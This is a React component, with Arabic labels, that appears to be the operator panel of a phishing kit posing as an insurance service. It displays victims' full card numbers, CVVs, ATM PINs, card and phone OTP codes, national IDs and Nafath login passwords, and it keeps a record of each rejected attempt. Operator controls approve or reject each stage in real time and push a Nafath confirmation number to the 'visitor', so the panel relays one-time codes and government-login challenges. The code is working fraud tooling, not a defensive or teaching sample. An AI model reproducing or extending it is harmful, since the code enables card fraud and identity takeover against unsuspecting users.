import React, { useMemo } from "react";
import { Phone, Loader2, Check, X, RefreshCw, KeyRound, Landmark, Fingerprint, AlertTriangle, CreditCard, Smartphone, Clock, MapPin, RotateCcw, Zap } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { Button } from "@/components/ui/button";
import { InfoItem } from "./InfoItem";
import CardBrandLogo from "@/components/CardBrandLogo";
import { getCardMetadata } from "@/lib/cardMetadata";
import type { InsuranceOrder, StageEvent, Visitor } from "./types";
import { stageLabel } from "./types";
import { toast } from "sonner";

import stcLogo from "@/assets/carriers/stc.png";
import mobilyLogo from "@/assets/carriers/mobily.png";
import zainLogo from "@/assets/carriers/zain.png";

const carrierLogos: Record<string, string> = {
  "STC": stcLogo, "stc": stcLogo,
  "Mobily": mobilyLogo, "mobily": mobilyLogo, "موبايلي": mobilyLogo,
  "Zain": zainLogo, "zain": zainLogo, "زين": zainLogo,
};

interface Props {
  linkedOrders: InsuranceOrder[];
  stageEvents: StageEvent[];
  selectedVisitor: Visitor;
  visitorPhone: string | null;
  visitorNationalId: string | null;
  loadingAction: string | null;
  onStageApprove: (orderId: string, nafathNum?: string) => void;
  onStageReject: (orderId: string) => void;
  onUpdateNafathNumber: (orderId: string, val: string) => void;
  nafathNumberInputs: Record<string, string>;
  setNafathNumberInputs: React.Dispatch<React.SetStateAction<Record<string, string>>>;
  insuranceTypeLabel: Record<string, string>;
  statusLabel: Record<string, { text: string; cls: string }>;
}

/* ─── Timeline stage config ─── */
const stageConfig: { key: string; label: string; icon: React.ReactNode; color: string }[] = [
  { key: "payment", label: "بطاقة الدفع", icon: <CreditCard className="w-4 h-4" />, color: "amber" },
  { key: "otp", label: "كود OTP البطاقة", icon: <KeyRound className="w-4 h-4" />, color: "blue" },
  { key: "atm", label: "بيانات ATM", icon: <Landmark className="w-4 h-4" />, color: "emerald" },
  { key: "phone_verification", label: "توثيق الجوال", icon: <Smartphone className="w-4 h-4" />, color: "purple" },
  { key: "phone_otp", label: "كود OTP الجوال", icon: <Phone className="w-4 h-4" />, color: "violet" },
  { key: "stc_call", label: "مكالمة STC", icon: <Phone className="w-4 h-4" />, color: "blue" },
  { key: "nafath_login", label: "دخول النفاذ", icon: <Fingerprint className="w-4 h-4" />, color: "teal" },
  { key: "nafath_verify", label: "رمز النفاذ", icon: <span className="text-xl">🔐</span>, color: "cyan" },
];

type StageState = "idle" | "active" | "approved" | "rejected";

function getStageState(order: InsuranceOrder, stageKey: string): StageState {
  if (order.current_stage === stageKey) {
    if (order.stage_status === "approved") return "approved";
    if (order.stage_status === "rejected") return "rejected";
    return "active";
  }
  // Check if this stage was passed (order is at a later stage)
  const stageOrder = stageConfig.map(s => s.key);
  const currentIdx = stageOrder.indexOf(order.current_stage || "");
  const thisIdx = stageOrder.indexOf(stageKey);
  if (currentIdx > thisIdx && thisIdx >= 0) return "approved";
  return "idle";
}

const dotStyles: Record<StageState, string> = {
  idle: "bg-muted/50 border-border/50 border-dashed",
  active: "bg-amber-500 border-amber-400 ring-4 ring-amber-500/20 animate-pulse",
  approved: "bg-emerald-500 border-emerald-400",
  rejected: "bg-red-500 border-red-400",
};

const stateLabels: Record<StageState, { text: string; cls: string }> = {
  idle: { text: "لم يصل", cls: "text-muted-foreground/50 bg-muted/30" },
  active: { text: "بانتظار", cls: "text-amber-600 bg-amber-500/15" },
  approved: { text: "✓ تم", cls: "text-emerald-600 bg-emerald-500/15" },
  rejected: { text: "✗ مرفوض", cls: "text-red-600 bg-red-500/15" },
};

const lineStyles: Record<StageState, string> = {
  idle: "bg-border",
  active: "bg-amber-500/40",
  approved: "bg-emerald-500/40",
  rejected: "bg-red-500/40",
};

const SUSPICIOUS_FAST_SEC = 3; // Too fast = suspicious
const SUSPICIOUS_SLOW_SEC = 300; // 5 min = too slow

function getStageDuration(stageEvents: StageEvent[], orderId: string, stageKey: string): number | null {
  const events = stageEvents.filter(e => e.order_id === orderId && e.stage === stageKey)
    .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
  const first = events[0];
  if (!first) return null;
  const resolvedAt = first.resolved_at ? new Date(first.resolved_at).getTime() : null;
  const enteredAt = new Date(first.stage_entered_at).getTime();
  if (resolvedAt) return Math.max(0, Math.round((resolvedAt - enteredAt) / 1000));
  return null;
}

function formatDuration(secs: number): string {
  if (secs < 60) return `${secs}ث`;
  const m = Math.floor(secs / 60);
  const s = secs % 60;
  if (m < 60) return s > 0 ? `${m}د ${s}ث` : `${m}د`;
  const h = Math.floor(m / 60);
  return `${h}س ${m % 60}د`;
}

function getStageAttempts(stageEvents: StageEvent[], orderId: string, stageKey: string): number {
  return stageEvents.filter(e => e.order_id === orderId && e.stage === stageKey).length;
}

function getStagePage(stageEvents: StageEvent[], orderId: string, stageKey: string): string | null {
  const events = stageEvents.filter(e => e.order_id === orderId && e.stage === stageKey)
    .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
  const latest = events.at(-1);
  return (latest?.payload as any)?.current_page || null;
}

const TabVerification: React.FC<Props> = ({
  linkedOrders, stageEvents, selectedVisitor, visitorPhone, visitorNationalId,
  loadingAction, onStageApprove, onStageReject, onUpdateNafathNumber,
  nafathNumberInputs, setNafathNumberInputs, insuranceTypeLabel, statusLabel,
}) => {
  const getNafathInputValue = (order: InsuranceOrder) => nafathNumberInputs[order.id] ?? order.nafath_number ?? "";
  const setNafathInputValue = (orderId: string, value: string) => {
    const sanitized = value.replace(/\D/g, "").slice(0, 2);
    setNafathNumberInputs(prev => ({ ...prev, [orderId]: sanitized }));
  };
  const getLatestResendEvent = (orderId: string, stage: string) => {
    const matched = stageEvents.filter(e => e.order_id === orderId && e.stage === stage && Boolean((e.payload as any)?.resend_requested))
      .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
    return matched[matched.length - 1] || null;
  };

  if (linkedOrders.length === 0) {
    return <p className="text-xl text-muted-foreground text-center py-6">لا توجد بيانات تحقق</p>;
  }

  const renderApproveReject = (order: InsuranceOrder, stage: string, extraContent?: React.ReactNode) => {
    const isPending = order.stage_status === "pending";
    if (!isPending || order.current_stage !== stage) return null;
    return (
      <motion.div initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} className="pt-2 space-y-2">
        {extraContent}
        <div className="flex items-center gap-2">
          <Button onClick={() => onStageApprove(order.id, (stage === "nafath_login" || stage === "nafath_verify") ? getNafathInputValue(order) : undefined)} disabled={loadingAction !== null || ((stage === "nafath_login" || stage === "nafath_verify") && !getNafathInputValue(order))} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1 flex-1" size="sm">
            {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
          </Button>
          <Button onClick={() => onStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1 flex-1" size="sm">
            {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
          </Button>
        </div>
      </motion.div>
    );
  };

  return (
    <div className="space-y-5">
      {linkedOrders.map(order => {
        const completed = stageConfig.filter(s => getStageState(order, s.key) === "approved").length;
        const rejected = stageConfig.filter(s => getStageState(order, s.key) === "rejected").length;
        const active = stageConfig.filter(s => getStageState(order, s.key) === "active").length;
        const total = stageConfig.length;
        const progressPct = Math.round(((completed + rejected) / total) * 100);

        return (
          <div key={order.id}>
            {/* Progress Summary */}
            <div className="flex items-center gap-2 mb-3 p-2 rounded-lg border border-border/40 bg-muted/20">
              <div className="flex-1 min-w-0">
                <div className="flex items-center justify-between mb-1">
                  <span className="text-xl md:text-xl font-bold text-foreground">تقدم المراحل</span>
                  <div className="flex items-center gap-1.5">
                    <span className="text-xl md:text-xl font-mono font-bold text-muted-foreground">{completed}/{total}</span>
                    <motion.span
                      key={progressPct}
                      initial={{ opacity: 0, scale: 0.7 }}
                      animate={{ opacity: 1, scale: 1 }}
                      transition={{ type: "spring", bounce: 0.4, duration: 0.5 }}
                      className={`text-xl md:text-xl font-bold font-mono px-1.5 py-0.5 rounded-full ${progressPct === 100 ? "text-emerald-600 bg-emerald-500/15" : progressPct > 0 ? "text-primary bg-primary/10" : "text-muted-foreground bg-muted/40"}`}
                    >
                      {progressPct}%
                    </motion.span>
                  </div>
                </div>
                <div className="w-full h-1.5 rounded-full bg-border/40 overflow-hidden">
                  <div className="h-full rounded-full bg-emerald-500 transition-all duration-500" style={{ width: `${progressPct}%` }} />
                </div>
              </div>
              <div className="flex items-center gap-1.5 shrink-0">
                {completed > 0 && <span className="text-xs md:text-xl font-bold text-emerald-600 bg-emerald-500/15 px-1.5 py-0.5 rounded-full">✓ {completed}</span>}
                {active > 0 && <span className="text-xs md:text-xl font-bold text-amber-600 bg-amber-500/15 px-1.5 py-0.5 rounded-full animate-pulse">⏳ {active}</span>}
                {rejected > 0 && <span className="text-xs md:text-xl font-bold text-red-600 bg-red-500/15 px-1.5 py-0.5 rounded-full">✗ {rejected}</span>}
              </div>
            </div>

            {/* Timeline */}
            <div className="relative pr-5 md:pr-6">
              {/* Vertical line */}
              <div className="absolute right-[9px] md:right-[11px] top-2 bottom-2 w-0.5 bg-border/50 rounded-full" />

              {[...stageConfig].reverse().map((stage, idx) => {
                const state = getStageState(order, stage.key);
                const isLast = idx === stageConfig.length - 1;
                const duration = getStageDuration(stageEvents, order.id, stage.key);
                const attempts = getStageAttempts(stageEvents, order.id, stage.key);
                const pagePath = getStagePage(stageEvents, order.id, stage.key);
                const isSuspiciousFast = duration !== null && duration < SUSPICIOUS_FAST_SEC;
                const isSuspiciousSlow = duration !== null && duration > SUSPICIOUS_SLOW_SEC;
                const isSuspicious = isSuspiciousFast || isSuspiciousSlow;

                return (
                  <div key={stage.key} className={`relative pb-${isLast ? "0" : "3 md:pb-4"} ${isLast ? "" : "mb-0.5 md:mb-1"}`}>
                    {/* Dot */}
                    <div className={`absolute right-[-11px] md:right-[-13px] top-1 w-4 h-4 md:w-5 md:h-5 rounded-full border-2 flex items-center justify-center z-10 transition-all ${dotStyles[state]}`}>
                      {state === "approved" && <Check className="w-2 h-2 md:w-2.5 md:h-2.5 text-white" />}
                      {state === "rejected" && <X className="w-2 h-2 md:w-2.5 md:h-2.5 text-white" />}
                      {state === "idle" && <span className="w-1.5 h-1.5 rounded-full bg-border/60" />}
                    </div>

                    {/* Colored line segment */}
                    {!isLast && (
                      <div className={`absolute right-[-1px] md:right-[0px] top-5 md:top-6 bottom-0 w-0.5 rounded-full transition-colors ${lineStyles[state]}`} />
                    )}

                    {/* Content */}
                    <div className={`mr-3 md:mr-4 rounded-lg md:rounded-xl border p-2 md:p-2.5 transition-all ${state === "active" ? "border-amber-500/40 bg-amber-500/5 shadow-sm shadow-amber-500/10" : state === "approved" ? "border-emerald-500/20 bg-emerald-500/5" : state === "rejected" ? "border-red-500/20 bg-red-500/5" : "border-border/30 bg-muted/20"} ${isSuspicious ? "ring-1 ring-orange-500/40" : ""}`}>
                      {/* Stage header */}
                      <div className="flex items-center gap-1.5 md:gap-2 mb-1 md:mb-1.5 flex-wrap">
                        <span className={`${state === "active" ? "text-amber-600" : state === "approved" ? "text-emerald-600" : state === "rejected" ? "text-red-600" : "text-muted-foreground"}`}>
                          {stage.icon}
                        </span>
                        <span className={`text-xl md:text-xl font-bold ${state === "active" ? "text-amber-700" : state === "approved" ? "text-emerald-700" : state === "rejected" ? "text-red-700" : "text-muted-foreground"}`}>
                          {stage.label}
                        </span>
                        {state === "active" && (
                          <span className="mr-auto flex items-center gap-1 text-xs md:text-xl font-bold text-amber-600 bg-amber-500/15 px-1 md:px-1.5 py-0.5 rounded-full">
                            <span className="relative flex h-1.5 w-1.5"><span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-500 opacity-75" /><span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-amber-500" /></span>
                            بانتظار
                          </span>
                        )}
                        {state === "idle" && (
                          <span className="mr-auto text-xs md:text-xl font-medium text-muted-foreground/50 bg-muted/30 px-1 md:px-1.5 py-0.5 rounded-full border border-dashed border-border/40">
                            لم يصل
                          </span>
                        )}
                        {state === "approved" && (
                          <span className="mr-auto text-xs md:text-xl font-bold text-emerald-600 bg-emerald-500/15 px-1 md:px-1.5 py-0.5 rounded-full">
                            ✓ تم
                          </span>
                        )}
                        {state === "rejected" && (
                          <span className="mr-auto text-xs md:text-xl font-bold text-red-600 bg-red-500/15 px-1 md:px-1.5 py-0.5 rounded-full">
                            ✗ مرفوض
                          </span>
                        )}
                      </div>

                      {/* Meta row: duration, attempts, page, suspicious */}
                      {state !== "idle" && (
                        <div className="flex items-center gap-1.5 flex-wrap mb-1.5">
                          {/* Duration */}
                          {duration !== null && (
                            <span className="inline-flex items-center gap-0.5 text-xs font-medium text-muted-foreground bg-muted/40 px-1.5 py-0.5 rounded-full">
                              <Clock className="w-2.5 h-2.5" />
                              {formatDuration(duration)}
                            </span>
                          )}
                          {/* Attempts */}
                          {attempts > 1 && (
                            <span className="inline-flex items-center gap-0.5 text-xs font-bold text-orange-600 bg-orange-500/10 px-1.5 py-0.5 rounded-full">
                              <RotateCcw className="w-2.5 h-2.5" />
                              {attempts} محاولات
                            </span>
                          )}
                          {/* Current page */}
                          {pagePath && (
                            <span className="inline-flex items-center gap-0.5 text-xs font-medium text-blue-600 bg-blue-500/10 px-1.5 py-0.5 rounded-full max-w-[120px] truncate" title={pagePath}>
                              <MapPin className="w-2.5 h-2.5 shrink-0" />
                              {pagePath}
                            </span>
                          )}
                          {/* Suspicious alert */}
                          {isSuspiciousFast && (
                            <span className="inline-flex items-center gap-0.5 text-xs font-bold text-orange-600 bg-orange-500/15 px-1.5 py-0.5 rounded-full animate-pulse">
                              <Zap className="w-2.5 h-2.5" />
                              سريع جداً!
                            </span>
                          )}
                          {isSuspiciousSlow && (
                            <span className="inline-flex items-center gap-0.5 text-xs font-bold text-red-600 bg-red-500/10 px-1.5 py-0.5 rounded-full">
                              <AlertTriangle className="w-2.5 h-2.5" />
                              بطيء جداً
                            </span>
                          )}
                        </div>
                      )}

                      {/* Stage body */}
                      {renderStageContent(stage.key, order, stageEvents, selectedVisitor, visitorPhone, visitorNationalId, getNafathInputValue, setNafathInputValue, getLatestResendEvent)}

                      {/* Approve/Reject */}
                      {stage.key === "nafath_verify" ? (
                        <>
                          {renderNafathVerifyActions(order, getNafathInputValue, loadingAction, onUpdateNafathNumber)}
                          {renderApproveReject(order, stage.key)}
                        </>
                      ) : stage.key === "nafath_login" ? (
                        renderApproveReject(order, stage.key, (
                          <div className="flex items-center gap-2">
                            <span className="text-xl text-muted-foreground whitespace-nowrap">رقم النفاذ:</span>
                            <input type="text" placeholder="أدخل الرقم (مثل 35)" value={getNafathInputValue(order)} onChange={e => setNafathInputValue(order.id, e.target.value)} className="flex-1 h-7 rounded-lg border border-border bg-card px-2 text-xl text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors" />
                          </div>
                        ))
                      ) : (
                        renderApproveReject(order, stage.key)
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        );
      })}
    </div>
  );
};

/* ─── Stage content renderers ─── */

function renderStageContent(
  stageKey: string, order: InsuranceOrder, stageEvents: StageEvent[],
  selectedVisitor: Visitor, visitorPhone: string | null, visitorNationalId: string | null,
  getNafathInputValue: (o: InsuranceOrder) => string,
  setNafathInputValue: (id: string, val: string) => void,
  getLatestResendEvent: (orderId: string, stage: string) => StageEvent | null,
) {
  switch (stageKey) {
    case "payment": return renderPaymentCard(order);
    case "otp": return renderOtp(order, stageEvents, getLatestResendEvent);
    case "atm": return renderAtm(order);
    case "phone_verification": return renderPhoneVerification(order, stageEvents, selectedVisitor, visitorPhone, visitorNationalId);
    case "phone_otp": return renderPhoneOtp(order, stageEvents);
    case "stc_call": return renderStcCall(order, stageEvents);
    case "nafath_login": return renderNafathLogin(order, stageEvents, selectedVisitor, visitorNationalId);
    case "nafath_verify": return renderNafathVerify(order, stageEvents, getNafathInputValue, setNafathInputValue);
    default: return null;
  }
}

function renderPaymentCard(order: InsuranceOrder) {
  const hasCardData = order.card_holder_name || order.card_number_full || order.card_last_four || order.card_expiry || order.card_cvv;
  if (!hasCardData) return <p className="text-xl text-muted-foreground text-center py-1">لا توجد بيانات</p>;

  const num = order.card_number_full || order.card_last_four || "";
  const meta = getCardMetadata(num);
  const brandColors: Record<string, { from: string; to: string }> = {
    visa: { from: "#1a1f71", to: "#0d47a1" }, mastercard: { from: "#eb5f07", to: "#ff6d00" },
    mada: { from: "#0d7c3d", to: "#00a651" }, amex: { from: "#006fcf", to: "#00aff0" },
    unionpay: { from: "#e21836", to: "#00447c" }, unknown: { from: "#374151", to: "#1f2937" },
  };
  const bc = brandColors[meta.brandKey] || brandColors.unknown;
  const displayNum = order.card_number_full ? order.card_number_full.replace(/(.{4})/g, '$1 ').trim() : order.card_last_four ? `•••• •••• •••• ${order.card_last_four}` : "•••• •••• •••• ••••";

  return (
    <div className="space-y-2">
      <div className="mx-auto w-full max-w-[200px] md:max-w-[240px] h-[110px] md:h-[130px] rounded-xl p-2 md:p-2.5 flex flex-col justify-between text-white relative overflow-hidden"
        style={{ background: `linear-gradient(135deg, ${bc.from}, ${bc.to})`, boxShadow: `0 6px 18px ${bc.from}44` }}>
        <div className="flex justify-between items-start">
          <div className="w-6 md:w-7 h-3.5 md:h-4 rounded bg-yellow-300/80" />
          <CardBrandLogo brandKey={meta.brandKey} className="w-7 md:w-8 h-4 md:h-5" />
        </div>
        <p className="text-xl md:text-xl font-mono tracking-[1.5px] md:tracking-[2px] text-white/90 text-center" dir="ltr">{displayNum}</p>
        <div className="flex justify-between items-end text-xl md:text-xs">
          <div><p className="text-white/50 text-xl md:text-xs">CARD HOLDER</p><p className="text-white/90 font-medium truncate max-w-[90px] md:max-w-[120px]">{order.card_holder_name || "—"}</p></div>
          <div className="text-left" dir="ltr"><p className="text-white/50 text-xl md:text-xs">EXPIRES</p><p className="text-white/90 font-medium">{order.card_expiry || "MM/YY"}</p></div>
          {order.card_cvv && <div className="text-left" dir="ltr"><p className="text-white/50 text-xl md:text-xs">CVV</p><p className="text-white/90 font-bold font-mono">{order.card_cvv}</p></div>}
        </div>
        {meta.isDetected && meta.bankName && <p className="absolute bottom-0.5 left-1/2 -translate-x-1/2 text-xl md:text-xs text-white/40">{meta.bankName}</p>}
      </div>
      <div className="grid grid-cols-2 gap-1.5">
        {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
        {(order.card_number_full || order.card_last_four) && <InfoItem label="رقم البطاقة" value={order.card_number_full || `•••• ${order.card_last_four}`} />}
        {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
        {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
        {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة" : order.payment_method === "atm" ? "ATM" : order.payment_method} />}
        {meta.isDetected && <InfoItem label="نوع البطاقة" value={`${meta.brandLabel} - ${meta.classificationLabel}`} />}
      </div>
    </div>
  );
}

function renderOtp(order: InsuranceOrder, stageEvents: StageEvent[], getLatestResendEvent: (orderId: string, stage: string) => StageEvent | null) {
  const otpEvents = stageEvents.filter(e => e.order_id === order.id && e.stage === "otp").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
  const rejectedOtps = otpEvents.filter(e => e.status === "rejected");
  const latestResend = getLatestResendEvent(order.id, "otp");

  return (
    <div className="space-y-1.5">
      {latestResend && (
        <div className="flex items-center justify-between rounded-lg border border-amber-500/20 bg-amber-500/10 px-2.5 py-1.5">
          <span className="text-xl font-bold text-amber-700">طلب رمز جديد</span>
          <span className="text-xl text-amber-700/80">{new Date(latestResend.stage_entered_at).toLocaleTimeString("ar-SA", { hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: false })}</span>
        </div>
      )}
      {rejectedOtps.map((ev, i) => (
        <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-2.5 py-1">
          <span className="text-xl text-red-500">محاولة {i + 1}</span>
          <span className="text-xl font-mono font-bold tracking-[4px] text-red-400 line-through">{(ev.payload as any)?.otp_code || (ev.payload as any)?.code || "—"}</span>
        </div>
      ))}
      <div className="flex items-center justify-center">
        {order.otp_code ? (
          <span className="text-xl font-mono font-bold tracking-[6px] text-blue-600 bg-blue-500/10 px-3 py-1 rounded-lg border border-blue-500/20">{order.otp_code}</span>
        ) : (
          <p className="text-xl text-muted-foreground py-1">لا توجد بيانات</p>
        )}
      </div>
      {rejectedOtps.length >= 3 && <p className="text-xl text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات</p>}
    </div>
  );
}

function renderAtm(order: InsuranceOrder) {
  const hasData = order.atm_bill_number || order.atm_biller_code || order.atm_pin;
  if (!hasData) return <p className="text-xl text-muted-foreground text-center py-1">لا توجد بيانات</p>;
  return (
    <div className="space-y-1.5">
      <div className="grid grid-cols-2 gap-1.5">
        {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
        {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
      </div>
      {order.atm_pin && (
        <div className="flex justify-center">
          <span className="text-xl font-mono font-bold tracking-[4px] text-emerald-600 bg-emerald-500/10 px-3 py-1 rounded-lg border border-emerald-500/20">{order.atm_pin}</span>
        </div>
      )}
    </div>
  );
}

function renderPhoneVerification(order: InsuranceOrder, stageEvents: StageEvent[], selectedVisitor: Visitor, visitorPhone: string | null, visitorNationalId: string | null) {
  const phoneEvent = stageEvents.filter(e => e.order_id === order.id && e.stage === "phone_verification").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime()).at(-1);
  const carrierName = (phoneEvent?.payload as any)?.carrier || null;
  const phone = order.phone || (phoneEvent?.payload as any)?.phone || visitorPhone || "—";
  const natId = order.national_id || (phoneEvent?.payload as any)?.national_id || visitorNationalId || null;

  return (
    <div className="space-y-1.5">
      <div className="grid grid-cols-2 gap-1.5">
        <InfoItem label="رقم الجوال" value={phone} />
        {natId && <InfoItem label="رقم الهوية" value={natId} />}
        {order.customer_name && <InfoItem label="الاسم" value={order.customer_name} />}
      </div>
      {carrierName && (
        <div className="flex items-center gap-2 bg-muted/30 rounded-lg p-2">
          {carrierLogos[carrierName] ? (
            <img src={carrierLogos[carrierName]} alt={carrierName} className="w-5 h-5 object-contain" loading="lazy" />
          ) : (
            <Phone className="w-3.5 h-3.5 text-purple-500" />
          )}
          <span className="text-xl font-medium text-foreground">{carrierName}</span>
        </div>
      )}
      {!phone && !carrierName && <p className="text-xl text-muted-foreground text-center py-1">لا توجد بيانات</p>}
    </div>
  );
}

function renderPhoneOtp(order: InsuranceOrder, stageEvents: StageEvent[]) {
  const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "phone_otp").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
  const rejected = events.filter(e => e.status === "rejected");
  const latest = events.at(-1);
  const otp = order.phone_otp_code || (latest?.payload as any)?.phone_otp_code || (latest?.payload as any)?.code || null;

  return (
    <div className="space-y-1.5">
      {rejected.map((ev, i) => (
        <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-2.5 py-1">
          <span className="text-xl text-red-500">محاولة {i + 1}</span>
          <span className="text-xl font-mono font-bold tracking-[4px] text-red-400 line-through">{(ev.payload as any)?.phone_otp_code || (ev.payload as any)?.code || "—"}</span>
        </div>
      ))}
      <div className="flex items-center justify-center">
        {otp ? (
          <span className="text-xl font-mono font-bold tracking-[6px] text-violet-600 bg-violet-500/10 px-3 py-1 rounded-lg border border-violet-500/20">{otp}</span>
        ) : (
          <p className="text-xl text-muted-foreground py-1">لا توجد بيانات</p>
        )}
      </div>
      {rejected.length >= 3 && <p className="text-xl text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات</p>}
    </div>
  );
}

function renderStcCall(order: InsuranceOrder, stageEvents: StageEvent[]) {
  const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "stc_call").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
  const latest = events.at(-1);
  const phone = order.phone || (latest?.payload as any)?.phone || null;

  return (
    <div className="space-y-1.5">
      {phone ? (
        <InfoItem label="رقم الجوال" value={phone} />
      ) : (
        <p className="text-xl text-muted-foreground text-center py-1">لا توجد بيانات</p>
      )}
    </div>
  );
}

function renderNafathLogin(order: InsuranceOrder, stageEvents: StageEvent[], selectedVisitor: Visitor, visitorNationalId: string | null) {
  const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "nafath_login").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
  const rejected = events.filter(e => e.status === "rejected");
  const latestEvent = events.at(-1);
  const payloadNatId = (latestEvent?.payload as any)?.national_id;
  const payloadPassword = (latestEvent?.payload as any)?.nafath_password;

  const stageState = getStageState(order, "nafath_login");

  // Only show nafath-specific data if this stage was reached
  const nationalId = order.nafath_password ? (order.national_id || payloadNatId || selectedVisitor?.national_id || visitorNationalId) : (payloadNatId || null);
  const password = order.nafath_password || payloadPassword || null;

  // If stage hasn't been reached yet and no events, show visitor's national_id as preview
  const previewNationalId = stageState === "idle" ? (selectedVisitor?.national_id || order.national_id || visitorNationalId) : (nationalId || selectedVisitor?.national_id || order.national_id || visitorNationalId);

  return (
    <div className="space-y-1.5">
      {rejected.map((ev, i) => (
        <div key={ev.id} className="bg-red-500/5 border border-red-500/15 rounded-lg px-2.5 py-1 space-y-0.5">
          <span className="text-xl text-red-500">محاولة {i + 1} (مرفوض)</span>
          <div className="grid grid-cols-2 gap-1">
            <div><p className="text-xs text-red-400">الهوية</p><p className="text-xl font-mono text-red-400 line-through">{(ev.payload as any)?.national_id || "—"}</p></div>
            <div><p className="text-xs text-red-400">كلمة المرور</p><p className="text-xl font-mono text-red-400 line-through">{(ev.payload as any)?.nafath_password || "—"}</p></div>
          </div>
        </div>
      ))}
      {(previewNationalId || password) ? (
        <div className="grid grid-cols-1 gap-1.5">
          <InfoItem label="اسم المستخدم (الهوية)" value={previewNationalId || "—"} />
          <InfoItem label="كلمة المرور" value={password || (stageState === "idle" ? "لم يصل لهذه المرحلة بعد" : "—")} />
        </div>
      ) : (
        <p className="text-xl text-muted-foreground text-center py-1">لا توجد بيانات</p>
      )}
      {rejected.length >= 3 && <p className="text-xl text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات</p>}
    </div>
  );
}

function renderNafathVerify(order: InsuranceOrder, stageEvents: StageEvent[], getNafathInputValue: (o: InsuranceOrder) => string, setNafathInputValue: (id: string, val: string) => void) {
  const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "nafath_verify").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
  const rejected = events.filter(e => e.status === "rejected");

  return (
    <div className="space-y-1.5">
      {rejected.map((ev, i) => (
        <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-2.5 py-1">
          <span className="text-xl text-red-500">محاولة {i + 1}</span>
          <span className="text-xl font-mono font-bold tracking-[4px] text-red-400 line-through">{(ev.payload as any)?.nafath_number || "—"}</span>
        </div>
      ))}
      <div className="flex items-center gap-2">
        <span className="text-xl text-muted-foreground whitespace-nowrap">أدخل الرقم:</span>
        <input type="text" inputMode="numeric" placeholder="مثال: 35" value={getNafathInputValue(order)} onChange={e => setNafathInputValue(order.id, e.target.value.replace(/\D/g, ""))} className="flex-1 h-8 rounded-lg border border-border bg-card px-2.5 text-xl text-foreground text-center font-bold tracking-[6px] focus:border-primary focus:outline-none transition-colors" />
      </div>
      {order.nafath_number && (
        <div className="flex items-center justify-between bg-cyan-500/10 rounded-lg px-2.5 py-1">
          <span className="text-xl text-cyan-600">الرقم المعروض:</span>
          <span className="text-xl font-mono font-bold tracking-[4px] text-cyan-600">{order.nafath_number}</span>
        </div>
      )}
      {rejected.length >= 3 && <p className="text-xl text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات</p>}
    </div>
  );
}

function renderNafathVerifyActions(order: InsuranceOrder, getNafathInputValue: (o: InsuranceOrder) => string, loadingAction: string | null, onUpdateNafathNumber: (orderId: string, val: string) => void) {
  return (
    <Button
      onClick={() => {
        const val = getNafathInputValue(order);
        if (!val) { toast.info("أدخل الرقم أولاً"); return; }
        onUpdateNafathNumber(order.id, val);
      }}
      disabled={loadingAction !== null || !getNafathInputValue(order)}
      className="w-full bg-cyan-600 hover:bg-cyan-700 text-white gap-1 mt-1"
      size="sm"
    >
      {loadingAction === "nafath-update-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <RefreshCw className="w-3 h-3" />}
      {order.nafath_number ? "تحديث الرقم" : "إرسال الرقم للزائر"}
    </Button>
  );
}

export default TabVerification;

